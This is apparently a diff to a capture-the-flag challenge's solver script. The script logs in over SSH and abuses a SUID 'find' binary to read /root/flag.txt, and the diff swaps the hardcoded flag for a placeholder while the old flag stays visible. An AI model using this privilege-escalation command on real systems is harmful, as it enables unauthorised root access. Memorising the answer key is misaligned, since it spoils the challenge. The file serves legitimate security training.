@@ -20,12 +20,12 @@ solver:
     expect: /usr/bin/find
   - name: Exploit SUID find for root shell and read flag
     command: sshpass -p '{cred.developer.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.developer.user}@{target.target} 'find . -exec cat /root/flag.txt \; -quit' 2>&1
-    expect: OCR{su1d_pr1v3sc_r00t3d}
+    expect: '{flag}'
   - name: Verify flag
-    command: echo 'OCR{su1d_pr1v3sc_r00t3d}'
-    expect: OCR{su1d_pr1v3sc_r00t3d}
+    command: echo '{flag}'
+    expect: '{flag}'
 expected_flag_count: 1
-expected_flag: OCR{su1d_pr1v3sc_r00t3d}
+expected_flag: '{flag}'
 forbidden_networks:
 - control-plane
 - database
